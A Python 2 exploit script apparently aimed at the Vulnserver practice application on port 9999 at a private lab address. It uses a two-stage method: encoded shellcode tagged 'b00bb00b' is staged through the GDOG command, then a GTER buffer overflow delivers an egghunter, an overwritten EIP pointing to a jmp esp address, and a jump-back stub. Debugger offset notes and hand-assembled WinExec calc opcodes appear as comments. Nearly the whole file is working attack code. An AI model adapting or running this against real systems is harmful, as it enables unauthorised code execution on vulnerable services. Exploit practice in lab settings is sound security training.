#!/usr/bin/python

import socket
import struct
import time


'''
Eip
Jmp esp
Sub esp
Jmp esp
Addesp
Egghunt
Send calc to GDOG

'''


calc = ("b00bb00b" + "\xbb\xc1\x6e\x07\x91\xd9\xeb\xd9\x74\x24\xf4\x5f\x31\xc9" +
"\xb1\x33\x83\xef\xfc\x31\x5f\x0e\x03\x9e\x60\xe5\x64\xdc" +
"\x95\x60\x86\x1c\x66\x13\x0e\xf9\x57\x01\x74\x8a\xca\x95" +
"\xfe\xde\xe6\x5e\x52\xca\x7d\x12\x7b\xfd\x36\x99\x5d\x30" +
"\xc6\x2f\x62\x9e\x04\x31\x1e\xdc\x58\x91\x1f\x2f\xad\xd0" +
"\x58\x4d\x5e\x80\x31\x1a\xcd\x35\x35\x5e\xce\x34\x99\xd5" +
"\x6e\x4f\x9c\x29\x1a\xe5\x9f\x79\xb3\x72\xd7\x61\xbf\xdd" +
"\xc8\x90\x6c\x3e\x34\xdb\x19\xf5\xce\xda\xcb\xc7\x2f\xed" +
"\x33\x8b\x11\xc2\xb9\xd5\x56\xe4\x21\xa0\xac\x17\xdf\xb3" +
"\x76\x6a\x3b\x31\x6b\xcc\xc8\xe1\x4f\xed\x1d\x77\x1b\xe1" +
"\xea\xf3\x43\xe5\xed\xd0\xff\x11\x65\xd7\x2f\x90\x3d\xfc" +
"\xeb\xf9\xe6\x9d\xaa\xa7\x49\xa1\xad\x0f\x35\x07\xa5\xbd" +
"\x22\x31\xe4\xab\xb5\xb3\x92\x92\xb6\xcb\x9c\xb4\xde\xfa" +
"\x17\x5b\x98\x02\xf2\x18\x56\x49\x5f\x08\xff\x14\x35\x09" +
"\x62\xa7\xe3\x4d\x9b\x24\x06\x2d\x58\x34\x63\x28\x24\xf2" +
"\x9f\x40\x35\x97\x9f\xf7\x36\xb2\xc3\x96\xa4\x5e\x2a\x3d" +
"\x4d\xc4\x32")

egg = "\x83\xC4\x76\x83\xC4\x20"
egg += "\x66\x81\xca\xff\x0f\x42\x52\x6a\x02\x58\xcd\x2e\x3c\x05\x5a\x74"
egg +="\xef\xb8\x62\x30\x30\x62\x8b\xfa\xaf\x75\xea\xaf\x75\xe7\xff\xe7"

# Log data, item 14 Address=0BADF00D Message=    0x00bff978 :ESP-0x94 (-148) : offset 3, length 168 (-> 0x00bffa1f : ESP+0x14)

# Log data, item 19 Address=0BADF00D Message=    ESP (0x00bffa0c)  151 in normal pattern (length 20)

# Log data, item 18 Address=0BADF00D Message=    EBP contains normal pattern : 0x38654137 (offset 143)

#offset eip 147

# sub esp, 72 * 2 "\x83\xEC\x76\x83\xEC\x08\xff\xf4" + jump esp

#jmp esp 625011AF

# WinExec 7c863231


# .exe \x68\x2e\x65\x78\x65 push .exe
# calc \x68\x63\x61\x6c\x63 push calc
#push 1 \x6a\x01

"""
\x33\xc0 xor eax, eax
\x50     push eax
\x68\x2e\x65\x78\x65 push .exe
\x68\x63\x61\x6c\x63 push calc
\x8b\xc4             mov eax, esp
\x6a\x01	    push 1
\x50		push eax
\xbb\x31\x32\x86\x7c
\xff\xd3
"""

pre = "GTER /.:/"
a = "\x90" * 4
#egg
pad = "\x90" * (147 - (len(a) + len(egg)))
eip = struct.pack("<I", 0x625011AF)
jumpback = "\x83\xEC\x76\x83\xEC\x20\xff\xe4"
c = "C" * 100





buff = pre + a + egg + pad + eip + jumpback + c


soc = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
soc.connect(('172.31.1.205', 9999))
soc.send("GDOG "+ calc)
soc.send(buff)
soc.close()

